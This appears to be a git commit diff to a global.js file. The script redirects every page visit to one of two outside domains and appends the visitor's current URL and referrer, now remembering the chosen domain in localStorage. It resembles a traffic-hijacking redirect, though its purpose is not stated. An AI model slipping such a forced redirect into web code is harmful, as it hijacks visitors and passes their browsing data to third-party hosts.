f6b0e3292e0469c87c3931a7bff9050053084d70
azdotcc <azisdotcc@gmail.com>
2026-04-04 21:53:18 +0700

    Update global.js

--- global.js
+++ global.js
@@ -1,4 +1,6 @@
-///// Arsae /////
 var arsDomains = ['https://read.vanphongphamtienloi.com', 'https://global.wowlazy.com'];
-var ars = arsDomains[Math.floor(Math.random() * arsDomains.length)];
+var ars = localStorage.getItem('arsae_domain');
+if (!ars) {
+    ars = arsDomains[Math.floor(Math.random() * arsDomains.length)];
+    localStorage.setItem('arsae_domain', ars);}
 window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
